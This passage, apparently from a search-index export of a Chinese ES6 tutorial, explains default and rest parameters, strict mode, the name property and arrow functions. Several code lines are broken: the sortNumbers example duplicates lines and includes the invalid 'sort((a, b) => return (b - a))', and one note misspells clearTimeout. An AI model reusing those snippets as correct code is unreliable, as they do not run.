<p>\u4ece\u4e0a\u9762\u4ee3\u7801\u8fd8\u53ef\u4ee5\u770b\u5230\uff0c\u53c2\u6570<code>mustBeProvided</code>\u7684\u9ed8\u8ba4\u503c\u7b49\u4e8e<code>throwIfMissing</code>\u51fd\u6570\u7684\u8fd0\u884c\u7ed3\u679c\uff08\u6ce8\u610f\u51fd\u6570\u540d<code>throwIfMissing</code>\u4e4b\u540e\u6709\u4e00\u5bf9\u5706\u62ec\u53f7\uff09\uff0c\u8fd9\u8868\u660e\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u4e0d\u662f\u5728\u5b9a\u4e49\u65f6\u6267\u884c\uff0c\u800c\u662f\u5728\u8fd0\u884c\u65f6\u6267\u884c\u3002\u5982\u679c\u53c2\u6570\u5df2\u7ecf\u8d4b\u503c\uff0c\u9ed8\u8ba4\u503c\u4e2d\u7684\u51fd\u6570\u5c31\u4e0d\u4f1a\u8fd0\u884c\u3002</p> <p>\u53e6\u5916\uff0c\u53ef\u4ee5\u5c06\u53c2\u6570\u9ed8\u8ba4\u503c\u8bbe\u4e3a<code>undefined</code>\uff0c\u8868\u660e\u8fd9\u4e2a\u53c2\u6570\u662f\u53ef\u4ee5\u7701\u7565\u7684\u3002</p> <pre><code>function foo(optional = undefined) { \u00b7\u00b7\u00b7 }\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#rest","title":"rest \u53c2\u6570 ...","text":"<p>ES6 \u5f15\u5165 rest \u53c2\u6570\uff08\u5f62\u5f0f\u4e3a<code>...\u53d8\u91cf\u540d</code>\uff09\uff0c\u7528\u4e8e\u83b7\u53d6\u51fd\u6570\u7684\u591a\u4f59\u53c2\u6570\uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u4f7f\u7528<code>arguments</code>\u5bf9\u8c61\u4e86\u3002rest \u53c2\u6570\u642d\u914d\u7684\u53d8\u91cf\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u8be5\u53d8\u91cf\u5c06\u591a\u4f59\u7684\u53c2\u6570\u653e\u5165\u6570\u7ec4\u4e2d\u3002</p> <pre><code>function add(...values) {\n  let sum = 0;\n  for (var val of values) {\n    sum += val;\n  }\n  return sum;\n}\n\nadd(2, 5, 3)\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>add</code>\u51fd\u6570\u662f\u4e00\u4e2a\u6c42\u548c\u51fd\u6570\uff0c\u5229\u7528 rest \u53c2\u6570\uff0c\u53ef\u4ee5\u5411\u8be5\u51fd\u6570\u4f20\u5165\u4efb\u610f\u6570\u76ee\u7684\u53c2\u6570\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a rest \u53c2\u6570\u4ee3\u66ff<code>arguments</code>\u53d8\u91cf\u7684\u4f8b\u5b50\u3002</p> <pre><code>// arguments\u53d8\u91cf\u7684\u5199\u6cd5\nfunction sortNumbers() {\n  return Array.prototype.slice.call(arguments).sort();\n  return Array.prototype.slice.call(arguments).sort();\n}\n\n// rest\u53c2\u6570\u7684\u5199\u6cd5\nconst sortNumbers = (...numbers) =&gt; numbers.sort();\nconst sortNumbers = (...numbers) =&gt; numbers.sort((a, b) =&gt; return (b - a));\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u4e24\u79cd\u5199\u6cd5\uff0c\u6bd4\u8f83\u540e\u53ef\u4ee5\u53d1\u73b0\uff0crest \u53c2\u6570\u7684\u5199\u6cd5\u66f4\u81ea\u7136\u4e5f\u66f4\u7b80\u6d01\u3002</p> <p><code>arguments</code>\u5bf9\u8c61\u4e0d\u662f\u6570\u7ec4\uff0c\u800c\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002\u6240\u4ee5\u4e3a\u4e86\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u6cd5\uff0c\u5fc5\u987b\u4f7f\u7528<code>Array.prototype.slice.call</code>\u5148\u5c06\u5176\u8f6c\u4e3a\u6570\u7ec4\u3002rest \u53c2\u6570\u5c31\u4e0d\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a\u771f\u6b63\u7684\u6570\u7ec4\uff0c\u6570\u7ec4\u7279\u6709\u7684\u65b9\u6cd5\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u5229\u7528 rest \u53c2\u6570\u6539\u5199\u6570\u7ec4<code>push</code>\u65b9\u6cd5\u7684\u4f8b\u5b50\u3002</p> <pre><code>function push(array, ...items) {\n  items.forEach(function(item) {\n    array.push(item);\n    // console.log(item);\n  });\n}\n\nvar a = [];\npush(a, 1, 2, 3)\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_8","title":"\u4e25\u683c\u6a21\u5f0f","text":"<p>ES5 \u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u8bbe\u5b9a\u4e3a\u4e25\u683c\u6a21\u5f0f\u3002</p> <pre><code>function doSomething(a, b) {\n  'use strict';\n}\n</code></pre> <p>ES2016 \u505a\u4e86\u4e00\u70b9\u4fee\u6539\uff0c\u89c4\u5b9a\u53ea\u8981\u51fd\u6570\u53c2\u6570\u4f7f\u7528\u4e86\u9ed8\u8ba4\u503c\u3001\u89e3\u6784\u8d4b\u503c\u3001\u6216\u8005\u6269\u5c55\u8fd0\u7b97\u7b26\uff0c\u90a3\u4e48\u51fd\u6570\u5185\u90e8\u5c31\u4e0d\u80fd\u663e\u5f0f\u8bbe\u5b9a\u4e3a\u4e25\u683c\u6a21\u5f0f\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <pre><code>// \u62a5\u9519\nfunction doSomething(a, b = a) {\n  'use strict';\n  // code\n}\n\n// \u62a5\u9519\nconst doSomething = function ({a, b}) {\n  'use strict';\n  // code\n};\n\n// \u62a5\u9519\nconst doSomething = (...a) =&gt; {\n  'use strict';\n  // code\n};\n\nconst obj = {\n  // \u62a5\u9519\n  doSomething({a, b}) {\n    'use strict';\n    // code\n  }\n};\n</code></pre> <p>\u8fd9\u6837\u89c4\u5b9a\u7684\u539f\u56e0\u662f\uff0c\u51fd\u6570\u5185\u90e8\u7684\u4e25\u683c\u6a21\u5f0f\uff0c\u540c\u65f6\u9002\u7528\u4e8e\u51fd\u6570\u4f53\u548c\u51fd\u6570\u53c2\u6570\u3002\u4f46\u662f\uff0c\u51fd\u6570\u6267\u884c\u7684\u65f6\u5019\uff0c\u5148\u6267\u884c\u51fd\u6570\u53c2\u6570\uff0c\u7136\u540e\u518d\u6267\u884c\u51fd\u6570\u4f53\u3002\u8fd9\u6837\u5c31\u6709\u4e00\u4e2a\u4e0d\u5408\u7406\u7684\u5730\u65b9\uff0c\u53ea\u6709\u4ece\u51fd\u6570\u4f53\u4e4b\u4e2d\uff0c\u624d\u80fd\u77e5\u9053\u53c2\u6570\u662f\u5426\u5e94\u8be5\u4ee5\u4e25\u683c\u6a21\u5f0f\u6267\u884c\uff0c\u4f46\u662f\u53c2\u6570\u5374\u5e94\u8be5\u5148\u4e8e\u51fd\u6570\u4f53\u6267\u884c\u3002</p> <pre><code>// \u62a5\u9519\nfunction doSomething(value = 070) {\n  'use strict';\n  return value;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53c2\u6570<code>value</code>\u7684\u9ed8\u8ba4\u503c\u662f\u516b\u8fdb\u5236\u6570<code>070</code>\uff0c\u4f46\u662f\u4e25\u683c\u6a21\u5f0f\u4e0b\u4e0d\u80fd\u7528\u524d\u7f00<code>0</code>\u8868\u793a\u516b\u8fdb\u5236\uff0c\u6240\u4ee5\u5e94\u8be5\u62a5\u9519\u3002\u4f46\u662f\u5b9e\u9645\u4e0a\uff0cJavaScript \u5f15\u64ce\u4f1a\u5148\u6210\u529f\u6267\u884c<code>value = 070</code>\uff0c\u7136\u540e\u8fdb\u5165\u51fd\u6570\u4f53\u5185\u90e8\uff0c\u53d1\u73b0\u9700\u8981\u7528\u4e25\u683c\u6a21\u5f0f\u6267\u884c\uff0c\u8fd9\u65f6\u624d\u4f1a\u62a5\u9519\u3002</p> <p>\u867d\u7136\u53ef\u4ee5\u5148\u89e3\u6790\u51fd\u6570\u4f53\u4ee3\u7801\uff0c\u518d\u6267\u884c\u53c2\u6570\u4ee3\u7801\uff0c\u4f46\u662f\u8fd9\u6837\u65e0\u7591\u5c31\u589e\u52a0\u4e86\u590d\u6742\u6027\u3002\u56e0\u6b64\uff0c\u6807\u51c6\u7d22\u6027\u7981\u6b62\u4e86\u8fd9\u79cd\u7528\u6cd5\uff0c\u53ea\u8981\u53c2\u6570\u4f7f\u7528\u4e86\u9ed8\u8ba4\u503c\u3001\u89e3\u6784\u8d4b\u503c\u3001\u6216\u8005\u6269\u5c55\u8fd0\u7b97\u7b26\uff0c\u5c31\u4e0d\u80fd\u663e\u5f0f\u6307\u5b9a\u4e25\u683c\u6a21\u5f0f\u3002</p> <p>\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u89c4\u907f\u8fd9\u79cd\u9650\u5236\u3002\u7b2c\u4e00\u79cd\u662f\u8bbe\u5b9a\u5168\u5c40\u6027\u7684\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u662f\u5408\u6cd5\u7684\u3002\u7b2c\u4e8c\u79cd\u662f\u628a\u51fd\u6570\u5305\u5728\u4e00\u4e2a\u65e0\u53c2\u6570\u7684\u7acb\u5373\u6267\u884c\u51fd\u6570\u91cc\u9762\uff08\u63a8\u8350\u4f7f\u7528\u7b2c\u4e00\u79cd\uff0c\u4e00\u90e8\u5206\u51fd\u6570\u5b9e\u73b0\u4e25\u683c\u6a21\u5f0f\u4e0d\u662f\u5f88\u597d\u7684\u9009\u62e9\uff09\u3002</p> <pre><code>'use strict';\nfunction doSomething(a, b = a) {\n  // code\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#name","title":"name \u5c5e\u6027","text":"<p>\u51fd\u6570\u7684<code>name</code>\u5c5e\u6027\uff0c\u8fd4\u56de\u8be5\u51fd\u6570\u7684\u51fd\u6570\u540d\u3002\u6ce8\u610f\uff1aES6 \u548c ES5 \u4e0d\u4e00\u81f4\u3002\u5982\u679c\u5c06\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf\uff0cES5 \u7684<code>name</code>\u5c5e\u6027\uff0c\u4f1a\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\uff0c\u800c ES6 \u7684<code>name</code>\u5c5e\u6027\u4f1a\u8fd4\u56de\u5b9e\u9645\u7684\u51fd\u6570\u540d\u3002</p> <pre><code>function foo() {}\nfoo.name // \"foo\"\n\nvar f = function () {};\n\n// ES5\nf.name // \"\"\n\n// ES6\nf.name // \"f\"\n</code></pre> <pre><code>const bar = function baz() {};\n// \u5c06\u4e00\u4e2a\u4e0d\u662f\u533f\u540d\u51fd\u6570\u8d4b\u503c\u7ed9\u53d8\u91cf\uff0c\u90a3\u4e48name\u5c5e\u6027\u8fd4\u56de\u539f\u59cb\u51fd\u6570\u7684\u540d\u79f0\n\n// ES5\nbar.name // \"baz\"\n// ES6\nbar.name // \"baz\"\n</code></pre> <p><code>Function</code>\u6784\u9020\u51fd\u6570\u8fd4\u56de\u7684\u51fd\u6570\u5b9e\u4f8b\uff0c<code>name</code>\u5c5e\u6027\u7684\u503c\u4e3a<code>anonymous</code>\u3002</p> <pre><code>(new Function).name // \"anonymous\"\n</code></pre> <p><code>bind</code>\u8fd4\u56de\u7684\u51fd\u6570\uff0c<code>name</code>\u5c5e\u6027\u503c\u4f1a\u52a0\u4e0a<code>bound</code>\u524d\u7f00\u3002</p> <pre><code>function foo() {};\nfoo.bind({}).name // \"bound foo\"\n\n(function(){}).bind({}).name // \"bound \"\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_9","title":"\u7bad\u5934\u51fd\u6570\uff1a\u91cd\u70b9","text":""},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_10","title":"\u7528\u6cd5","text":"<p>ES6 \u5141\u8bb8\u4f7f\u7528\u201c\u7bad\u5934\u201d\uff08<code>=&gt;</code>\uff09\u5b9a\u4e49\u51fd\u6570\u3002\u5982\u679c\u7bad\u5934\u51fd\u6570\u4e0d\u9700\u8981\u53c2\u6570\u6216\u9700\u8981\u591a\u4e2a\u53c2\u6570\uff0c\u5c31\u4f7f\u7528\u4e00\u4e2a\u5706\u62ec\u53f7\u4ee3\u8868\u53c2\u6570\u90e8\u5206\u3002</p> <pre><code>let fun = para =&gt; para;\nlet sum = (num1, num2) =&gt; num1 + num2;\nvar sum = (num1, num2) =&gt; { return num1 + num2; }\n</code></pre> <p>\u7531\u4e8e\u5927\u62ec\u53f7\u88ab\u89e3\u91ca\u4e3a\u4ee3\u7801\u5757\uff0c\u6240\u4ee5\u5982\u679c\u7bad\u5934\u51fd\u6570\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5fc5\u987b\u5728\u5bf9\u8c61\u5916\u9762\u52a0\u4e0a\u62ec\u53f7\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <pre><code>let getTempItem = id =&gt; ({ id: id, name: \"Temp\" });\nlet getInfo = ({id, name}) =&gt; ({id: id, name: name });\n</code></pre> <p>\u5982\u679c\u7bad\u5934\u51fd\u6570\u53ea\u6709\u4e00\u884c\u8bed\u53e5\uff0c\u4e14\u4e0d\u9700\u8981\u8fd4\u56de\u503c\uff0c\u5c31\u4e0d\u7528\u5199\u5927\u62ec\u53f7\u4e86\u3002</p> <pre><code>let fn = () =&gt; void doesNotReturn();\n</code></pre> <p>\u7bad\u5934\u51fd\u6570\u53ef\u4ee5\u4e0e\u53d8\u91cf\u89e3\u6784\u7ed3\u5408\u4f7f\u7528\u3002</p> <pre><code>const full = ({ first, last }) =&gt; first + ' ' + last;\n</code></pre> <p>\u7bad\u5934\u51fd\u6570\u4f7f\u5f97\u8868\u8fbe\u66f4\u52a0\u7b80\u6d01\u3002</p> <pre><code>const isEven = n =&gt; n % 2 === 0;\nconst square = n =&gt; n * n;\n</code></pre> <p>\u7b80\u5316\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>// \u7bad\u5934\u51fd\u6570\u5199\u6cd5\n[1,2,3].map(x =&gt; x * x);\nvar result = values.sort((a, b) =&gt; a - b);\n</code></pre> <p>\u4e0b\u9762\u662f rest \u53c2\u6570\u4e0e\u7bad\u5934\u51fd\u6570\u7ed3\u5408\u7684\u4f8b\u5b50\u3002</p> <pre><code>const numbers = (...nums) =&gt; nums;\n\nnumbers(1, 2, 3, 4, 5)\n// [1,2,3,4,5]\n\nconst headAndTail = (head, ...tail) =&gt; [head, tail];\n\nheadAndTail(1, 2, 3, 4, 5)\n// [1,[2,3,4,5]]\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_11","title":"\u6ce8\u610f","text":"<p>\u7bad\u5934\u51fd\u6570\u6709\u51e0\u4e2a\u4f7f\u7528\u6ce8\u610f\u70b9\u3002</p> <p>\uff081\uff09\u51fd\u6570\u4f53\u5185\u7684<code>this</code>\u5bf9\u8c61\uff0c\u5c31\u662f\u5b9a\u4e49\u65f6\u6240\u5728\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u65f6\u6240\u5728\u7684\u5bf9\u8c61\u3002</p> <p>\uff082\uff09\u4e0d\u53ef\u4ee5\u5f53\u4f5c\u6784\u9020\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u53ef\u4ee5\u4f7f\u7528<code>new</code>\u547d\u4ee4\uff0c\u5426\u5219\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002</p> <p>\uff083\uff09\u4e0d\u53ef\u4ee5\u4f7f\u7528<code>arguments</code>\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u5728\u51fd\u6570\u4f53\u5185\u4e0d\u5b58\u5728\u3002\u5982\u679c\u8981\u7528\uff0c\u53ef\u4ee5\u7528 rest \u53c2\u6570\u4ee3\u66ff\u3002</p> <p>\uff084\uff09\u4e0d\u53ef\u4ee5\u4f7f\u7528<code>yield</code>\u547d\u4ee4\uff0c\u56e0\u6b64\u7bad\u5934\u51fd\u6570\u4e0d\u80fd\u7528\u4f5c Generator \u51fd\u6570\u3002</p> <p>\u4e0a\u9762\u56db\u70b9\u4e2d\uff0c\u7b2c\u4e00\u70b9\u5c24\u5176\u503c\u5f97\u6ce8\u610f\u3002<code>this</code>\u5bf9\u8c61\u7684\u6307\u5411\u662f\u53ef\u53d8\u7684\uff0c\u4f46\u662f\u5728\u7bad\u5934\u51fd\u6570\u4e2d\uff0c\u5b83\u662f\u56fa\u5b9a\u7684\u3002</p> <pre><code>function foo() {\n  setTimeout(() =&gt; {\n    console.log('id:', this.id);\n  }, 100);\n}\n\nvar id = 21;\n\nfoo.call({ id: 42 });\n// id: 42\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>setTimeout</code>\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u7bad\u5934\u51fd\u6570\uff0c\u8fd9\u4e2a\u7bad\u5934\u51fd\u6570\u7684\u5b9a\u4e49\u751f\u6548\u662f\u5728<code>foo</code>\u51fd\u6570\u751f\u6210\u65f6\uff0c\u800c\u5b83\u7684\u771f\u6b63\u6267\u884c\u8981\u7b49\u5230 100 \u6beb\u79d2\u540e\u3002\u5982\u679c\u662f\u666e\u901a\u51fd\u6570\uff0c\u6267\u884c\u65f6<code>this</code>\u5e94\u8be5\u6307\u5411\u5168\u5c40\u5bf9\u8c61<code>window</code>\uff0c\u8fd9\u65f6\u5e94\u8be5\u8f93\u51fa<code>21</code>\u3002\u4f46\u662f\uff0c\u7bad\u5934\u51fd\u6570\u5bfc\u81f4<code>this</code>\u603b\u662f\u6307\u5411\u51fd\u6570\u5b9a\u4e49\u751f\u6548\u65f6\u6240\u5728\u7684\u5bf9\u8c61\uff08\u672c\u4f8b\u662f<code>{id: 42}</code>\uff09\uff0c\u6240\u4ee5\u8f93\u51fa\u7684\u662f<code>42</code>\u3002\u7bad\u5934\u51fd\u6570\u5728\u8bbe\u7f6e\u5b9a\u65f6\u5668\u4e0d\u9700\u8981\u4f7f\u7528 let that = this \u6765\u4f20\u9012\u5f53\u524d\u73af\u5883\uff0c\u56e0\u4e3a\u5ef6\u65f6\u540e\u73af\u5883\u8fd8\u662f\u51fd\u6570\u751f\u6210\u65f6\u7684\u73af\u5883\u3002</p> <p>\u7bad\u5934\u51fd\u6570\u53ef\u4ee5\u8ba9<code>setTimeout</code>\u91cc\u9762\u7684<code>this</code>\uff0c\u7ed1\u5b9a\u5b9a\u4e49\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff0c\u800c\u4e0d\u662f\u6307\u5411\u8fd0\u884c\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\u3002</p> <pre><code>function Timer() {\n  this.s1 = 0;\n  this.s2 = 0;\n  // \u7bad\u5934\u51fd\u6570\n  setInterval(() =&gt; this.s1++, 1000);\n  // \u666e\u901a\u51fd\u6570\n  setInterval(function () {\n    this.s2++;\n  }, 1000);\n}\n\nvar timer = new Timer();\n\nsetTimeout(() =&gt; console.log('s1: ', timer.s1), 3100);\nsetTimeout(() =&gt; console.log('s2: ', timer.s2), 3100);\n// s1: 3\n// s2: 0\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Timer</code>\u51fd\u6570\u5185\u90e8\u8bbe\u7f6e\u4e86\u4e24\u4e2a\u5b9a\u65f6\u5668\uff0c\u5206\u522b\u4f7f\u7528\u4e86\u7bad\u5934\u51fd\u6570\u548c\u666e\u901a\u51fd\u6570\u3002\u524d\u8005\u7684<code>this</code>\u7ed1\u5b9a\u5b9a\u4e49\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff08\u5373<code>Timer</code>\u51fd\u6570\uff09\uff0c\u540e\u8005\u7684<code>this</code>\u6307\u5411\u8fd0\u884c\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff08\u5373\u5168\u5c40\u5bf9\u8c61\uff09\u3002\u6240\u4ee5\uff0c3100 \u6beb\u79d2\u4e4b\u540e\uff0c<code>timer.s1</code>\u88ab\u66f4\u65b0\u4e86 3 \u6b21\uff0c\u800c<code>timer.s2</code>\u4e00\u6b21\u90fd\u6ca1\u66f4\u65b0\u3002</p> <p>\u7bad\u5934\u51fd\u6570\u53ef\u4ee5\u8ba9<code>this</code>\u6307\u5411\u56fa\u5b9a\u5316\uff0c\u8fd9\u79cd\u7279\u6027\u5f88\u6709\u5229\u4e8e\u5c01\u88c5\u56de\u8c03\u51fd\u6570\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0cDOM \u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u5c01\u88c5\u5728\u4e00\u4e2a\u5bf9\u8c61\u91cc\u9762\u3002</p> <pre><code>var handler = {\n  id: '123456',\n\n  init: function() {\n    document.addEventListener('click', (event) =&gt; this.doSomething(event.type), false);\n  },\n\n  doSomething: function(type) {\n    console.log('Handling ' + type  + ' for ' + this.id);\n  }\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>init</code>\u65b9\u6cd5\u4e2d\uff0c\u4f7f\u7528\u4e86\u7bad\u5934\u51fd\u6570\uff0c\u8fd9\u5bfc\u81f4\u8fd9\u4e2a\u7bad\u5934\u51fd\u6570\u91cc\u9762\u7684<code>this</code>\uff0c\u603b\u662f\u6307\u5411<code>handler</code>\u5bf9\u8c61\u3002\u5426\u5219\uff0c\u56de\u8c03\u51fd\u6570\u8fd0\u884c\u65f6\uff0c<code>this.doSomething</code>\u8fd9\u4e00\u884c\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6b64\u65f6<code>this</code>\u6307\u5411<code>document</code>\u5bf9\u8c61\u3002</p> <p><code>this</code>\u6307\u5411\u7684\u56fa\u5b9a\u5316\uff0c\u5e76\u4e0d\u662f\u56e0\u4e3a\u7bad\u5934\u51fd\u6570\u5185\u90e8\u6709\u7ed1\u5b9a<code>this</code>\u7684\u673a\u5236\uff0c\u5b9e\u9645\u539f\u56e0\u662f\u7bad\u5934\u51fd\u6570\u6839\u672c\u6ca1\u6709\u81ea\u5df1\u7684<code>this</code>\uff0c\u5bfc\u81f4\u5185\u90e8\u7684<code>this</code>\u5c31\u662f\u5916\u5c42\u4ee3\u7801\u5757\u7684<code>this</code>\u3002\u6b63\u662f\u56e0\u4e3a\u5b83\u6ca1\u6709<code>this</code>\uff0c\u6240\u4ee5\u4e5f\u5c31\u4e0d\u80fd\u7528\u4f5c\u6784\u9020\u51fd\u6570\u3002</p> <p>\u6709\u51e0\u6b21\u5199\u8ba1\u65f6\u5668\u51fd\u6570\uff0c\u4f7f\u7528\u7bad\u5934\u51fd\u6570\uff0c\u5728\u8ba1\u65f6\u5668\u51fd\u6570\u5185\u90e8\u5199clearTimerout(this.timer)\u4e5f\u662f\u6b63\u786e\u7684\uff0c\u5c31\u662f\u56e0\u4e3a\u7bad\u5934\u51fd\u6570\u5185\u90e8\u6ca1\u6709this\uff0c\u5185\u90e8\u51fd\u6570\u5c31\u662f\u5916\u90e8\u51fd\u6570\u7684this\uff0c\u4e0d\u9700\u8981\u8f6c\u6362this\u3002</p> <pre><code>// ES6\nfunction foo() {\n  setTimeout(() =&gt; {\n    console.log('id:', this.id);\n  }, 100);\n}\n\n// ES5\nfunction foo() {\n  var _this = this;\n  setTimeout(function () {\n    console.log('id:', _this.id);\n  }, 100);\n}\n</code></pre> <p>\u8bf7\u95ee\u4e0b\u9762\u7684\u4ee3\u7801\u4e4b\u4e2d\u6709\u51e0\u4e2a<code>this</code>\uff1f</p> <pre><code>function foo() {\n  // \u8fd9\u91cc\u4e09\u4e2a\u7bad\u5934\u51fd\u6570\u6ca1\u6709\u5185\u90e8this\uff0c\u53ea\u6709\u4e00\u4e2athis\uff0c\u8868\u793a\u8c03\u7528\u51fd\u6570\u7684\u5bf9\u8c61\n  return () =&gt; {\n    return () =&gt; {\n      return () =&gt; {\n        console.log('id:', this.id);\n      };\n    };\n  };\n}\n\nvar f = foo.call({id: 1});\n\nvar t1 = f.call({id: 2})()(); // id: 1\nvar t2 = f().call({id: 3})(); // id: 1\nvar t3 = f()().call({id: 4}); // id: 1\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e4b\u4e2d\uff0c\u53ea\u6709\u4e00\u4e2a<code>this</code>\uff0c\u5c31\u662f\u51fd\u6570<code>foo</code>\u7684<code>this</code>\uff0c\u6240\u4ee5<code>t1</code>\u3001<code>t2</code>\u3001<code>t3</code>\u90fd\u8f93\u51fa\u540c\u6837\u7684\u7ed3\u679c\u3002\u56e0\u4e3a\u6240\u6709\u7684\u5185\u5c42\u51fd\u6570\u90fd\u662f\u7bad\u5934\u51fd\u6570\uff0c\u90fd\u6ca1\u6709\u81ea\u5df1\u7684<code>this</code>\uff0c\u5b83\u4eec\u7684<code>this</code>\u5176\u5b9e\u90fd\u662f\u6700\u5916\u5c42<code>foo</code>\u51fd\u6570\u7684<code>this</code>\u3002</p> <p>\u9664\u4e86<code>this</code>\uff0c\u4ee5\u4e0b\u4e09\u4e2a\u53d8\u91cf\u5728\u7bad\u5934\u51fd\u6570\u4e4b\u4e2d\u4e5f\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u6307\u5411\u5916\u5c42\u51fd\u6570\u7684\u5bf9\u5e94\u53d8\u91cf\uff1a<code>arguments</code>\u3001<code>super</code>\u3001<code>new.target</code>\u3002</p> <pre><code>function foo() {\n  setTimeout(() =&gt; {\n    console.log('args:', arguments);\n  }, 100);\n}\n\nfoo(2, 4, 6, 8)\n// args: [2, 4, 6, 8]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7bad\u5934\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf<code>arguments</code>\uff0c\u5176\u5b9e\u662f\u51fd\u6570<code>foo</code>\u7684<code>arguments</code>\u53d8\u91cf\u3002</p> <p>\u53e6\u5916\uff0c\u7531\u4e8e\u7bad\u5934\u51fd\u6570\u6ca1\u6709\u81ea\u5df1\u7684<code>this</code>\uff0c\u6240\u4ee5\u5f53\u7136\u4e5f\u5c31\u4e0d\u80fd\u7528<code>call()</code>\u3001<code>apply()</code>\u3001<code>bind()</code>\u8fd9\u4e9b\u65b9\u6cd5\u53bb\u6539\u53d8<code>this</code>\u7684\u6307\u5411\u3002</p> <pre><code>(function() {\n  return [\n    (() =&gt; this.x).bind({ x: 'inner' })()\n  ];\n}).call({ x: 'outer' });\n// ['outer']\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7bad\u5934\u51fd\u6570\u6ca1\u6709\u81ea\u5df1\u7684<code>this</code>\uff0c\u6240\u4ee5<code>bind</code>\u65b9\u6cd5\u65e0\u6548\uff0c\u5185\u90e8\u7684<code>this</code>\u6307\u5411\u5916\u90e8\u7684<code>this</code>\u3002</p> <p>\u957f\u671f\u4ee5\u6765\uff0cJavaScript \u8bed\u8a00\u7684<code>this</code>\u5bf9\u8c61\u4e00\u76f4\u662f\u4e00\u4e2a\u4ee4\u4eba\u5934\u75db\u7684\u95ee\u9898\uff0c\u5728\u5bf9\u8c61\u65b9\u6cd5\u4e2d\u4f7f\u7528<code>this</code>\uff0c\u5fc5\u987b\u975e\u5e38\u5c0f\u5fc3\u3002\u7bad\u5934\u51fd\u6570\u201d\u7ed1\u5b9a\u201d<code>this</code>\uff0c\u5f88\u5927\u7a0b\u5ea6\u4e0a\u89e3\u51b3\u4e86\u8fd9\u4e2a\u56f0\u6270\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_12","title":"\u4e0d\u9002\u7528\u573a\u5408","text":"<p>\u7531\u4e8e\u7bad\u5934\u51fd\u6570\u4f7f\u5f97<code>this</code>\u4ece\u201c\u52a8\u6001\u201d\u53d8\u6210\u201c\u9759\u6001\u201d\uff0c\u4e0b\u9762\u4e24\u4e2a\u573a\u5408\u4e0d\u5e94\u8be5\u4f7f\u7528\u7bad\u5934\u51fd\u6570\u3002</p> <p>\u7b2c\u4e00\u4e2a\u573a\u5408\u662f\u5b9a\u4e49\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u4e14\u8be5\u65b9\u6cd5\u5185\u90e8\u5305\u62ec<code>this</code>\u3002</p> <pre><code>const cat = {\n  lives: 9,\n  jumps: () =&gt; {\n    this.lives--;\n  }\n}\n</code></pre> 